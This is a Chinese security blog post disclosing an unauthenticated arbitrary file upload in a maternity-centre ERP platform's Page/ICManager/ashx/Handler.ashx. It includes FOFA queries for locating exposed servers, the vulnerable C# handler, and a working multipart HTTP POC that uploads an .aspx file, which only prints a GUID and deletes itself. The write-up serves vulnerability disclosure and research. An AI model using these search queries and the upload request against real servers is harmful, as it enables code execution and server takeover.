---
title: "月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ICManager-rce.html
asset_dir: assets/月子会所erp管理云平台-pageicmanagerashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/4 08:35
* 603浏览
* [0评论](#comment)
* 25分钟阅读

深入探索

企业资源计划

ERP

Server


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/ICManager/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

深入探索

SQL

服务器

云计算

直接看其业务实现逻辑

```
public class Handler : IHttpHandler {

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名

                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";
                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"].ToString();
                //../../UploadBaseFolder/Contact/
                mypost.SaveAs(context.Server.MapPath("../" + url + newname));
                System.Threading.Thread.Sleep(100);

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);

    }

    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;

    }
```

深入探索

云平台

软件

物流软件安全

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_CONTACT\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_CONTACT_URL" value="../../UploadBaseFolder/Contact/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Contact/文件名

# 漏洞复现

## POC

```
POST /Page/ICManager/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Contact/响应文件名

漏洞修复方案

[![月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-27f15b594bab.webp)](https://image.mrxn.net/c9ef0f2991d54c659999c0043989093a.webp)

成功打印随机GUID字符串并删除自身。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [4.1.POC](#toc-4-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 Page/ICManager/ashx/Handler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-ICManager-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-ICManager-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ICManager-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ICManager-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 